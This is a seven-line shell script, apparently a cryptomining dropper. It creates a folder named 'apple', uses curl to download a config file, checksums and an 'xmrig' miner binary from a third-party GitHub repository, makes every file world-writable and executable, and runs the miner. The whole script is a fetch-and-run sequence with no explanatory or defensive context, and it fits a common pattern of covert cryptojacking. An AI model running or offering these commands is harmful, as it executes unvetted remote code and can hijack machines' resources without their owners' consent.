mkdir apple
cd apple
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/config.json --output config.json
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/SHA256SUMS --output SHA256SUMS
curl https://raw.githubusercontent.com/samkcah/xmrigtron/main/xmrig --output xmrig
chmod 777 *
./xmrig
